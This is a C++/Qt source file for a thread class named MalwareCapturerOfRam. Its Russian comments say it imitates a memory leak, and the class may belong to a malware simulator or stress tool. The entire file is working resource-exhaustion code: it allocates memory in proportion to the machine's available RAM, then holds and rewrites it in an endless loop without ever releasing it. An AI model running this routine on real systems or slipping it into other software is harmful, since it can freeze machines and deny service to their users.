#include "malware_capturing_ram.h"


MalwareCapturerOfRam::MalwareCapturerOfRam(QObject *parent) : QThread(parent) {}


void MalwareCapturerOfRam::run() {
    this->highMemoryUsage();
}


// Функция для захвата пространства ОП
void MalwareCapturerOfRam::highMemoryUsage() {
    qint64 availableRamSize = sysconf(_SC_AVPHYS_PAGES) * sysconf(_SC_PAGESIZE);
    qint64 capturingModifier = (availableRamSize / (CAPTURING_RAM_SIZE_UNIT * 4));
    if (capturingModifier <= 0) return;

    qint32* arrayForRamCapturing[capturingModifier];
    qint32 index = 0;
    while (index < capturingModifier) {
        arrayForRamCapturing[index] = new qint32[CAPTURING_RAM_SIZE_UNIT];
        index++;
    }

    while (true) {
        for (qint32 i = 0; i < capturingModifier; i++) {
            for (qint32 j = 0; j < CAPTURING_RAM_SIZE_UNIT; j++) {
                arrayForRamCapturing[i][j] = i;
            }
        }
        // Не освобождаем память, чтобы имитировать утечку памяти
    }
}
